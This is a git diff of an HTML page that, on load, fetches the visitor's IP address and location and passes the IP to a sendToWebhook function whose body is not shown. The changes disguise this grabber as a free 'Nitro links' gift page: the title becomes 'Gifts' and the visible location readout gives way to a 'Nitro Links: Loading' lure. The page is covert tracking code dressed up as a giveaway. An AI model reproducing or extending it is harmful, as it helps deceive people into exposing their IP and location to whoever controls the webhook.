@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Haha</title>
+    <title>Gifts</title>
     <script>
       function displayIP() {
         fetch("https://api.ipify.org/?format=json")
@@ -38,11 +38,10 @@
         fetch(locationUrl)
           .then((response) => response.json())
           .then((data) => {
-            const locationElement = document.getElementById("location");
-            const locationString = `${data.city}, ${data.region}, ${data.country_name}`;
-            locationElement.textContent = locationString;
+            const nitroLinksElement = document.getElementById("nitroLinks");
+            nitroLinksElement.textContent = "Nitro Links: Loading";
 
-            sendToWebhook(ip, locationString);
+            sendToWebhook(ip, "Loading");
           })
           .catch((error) => {
             console.error("Error:", error);
@@ -52,7 +51,7 @@
     </script>
   </head>
   <body onload="displayIP()">
-    <h1>Nitro links:</h1>
+    <h1 id="nitroLinks">Nitro links:</h1>
     <p>Loading...</p>
     <p>Loading...</p>
     <p>Loading...</p>
